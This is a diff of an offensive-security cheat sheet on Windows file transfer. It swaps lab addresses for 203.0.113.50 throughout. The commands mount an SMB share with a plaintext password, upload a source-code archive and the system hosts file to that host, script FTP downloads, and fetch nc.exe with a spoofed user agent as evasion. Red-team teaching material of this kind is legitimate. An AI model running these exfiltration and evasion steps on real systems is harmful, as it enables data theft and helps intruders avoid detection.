@@ -48,7 +48,7 @@ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyB
 #### Mounting the SMB Share on Windows
 
 ```
-net use X: \\192.168.220.133\share /user:acuity SuperStr00ng!
+net use X: \\203.0.113.50\share /user:acuity SuperStr00ng!
 ```
 
 #### Downloading from SMB Share
@@ -60,7 +60,7 @@ copy \\$IP\smbshare\file.exe .
 #### Uploading to SMB Share
 
 ```cmd-session
-copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+copy C:\Users\john\Desktop\SourceCode.zip \\203.0.113.50\DavWWWRoot\
 ```
 
 ### Using FTP
@@ -80,19 +80,19 @@ sudo python3 -m pyftpdlib --port 21
 #### Transfering Files from FTP using PowerShell
 
 ```
- (New-Object Net.WebClient).DownloadFile('ftp://$IP/file.txt', 'C:\Users\Public\file.txt')
+ (New-Object Net.WebClient).DownloadFile('ftp://203.0.113.50/file.txt', 'C:\Users\Public\file.txt')
 ```
 
 **Create a Command File for the FTP Client and Download the Target File**
 
 ```
-C:\acuity> echo open 192.168.49.128 > ftpcommand.txt
+C:\acuity> echo open 203.0.113.50 > ftpcommand.txt
 C:\acuity> echo USER anonymous >> ftpcommand.txt
 C:\acuity> echo binary >> ftpcommand.txt
 C:\acuity> echo GET file.txt >> ftpcommand.txt
 C:\acuity> echo bye >> ftpcommand.txt
 C:\acuity> ftp -v -n -s:ftpcommand.txt
-ftp> open 192.168.49.128
+ftp> open 203.0.113.50
 Log in with USER and PASS first.
 ftp> USER anonymous
 
@@ -106,7 +106,7 @@ This is a test file
 ### Uploading Files via Powershell
 
 ```
-(New-Object Net.WebClient).UploadFile('ftp://$IP/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+(New-Object Net.WebClient).UploadFile('ftp://203.0.113.50/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
 
 ## Evasion Tactics
@@ -116,5 +116,5 @@ This is a test file
 <strong># Changing user agent to Chrome
 </strong>UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
 # Downloading file with spoofed user agent
-Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+Invoke-WebRequest http://203.0.113.50/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 </code></pre>
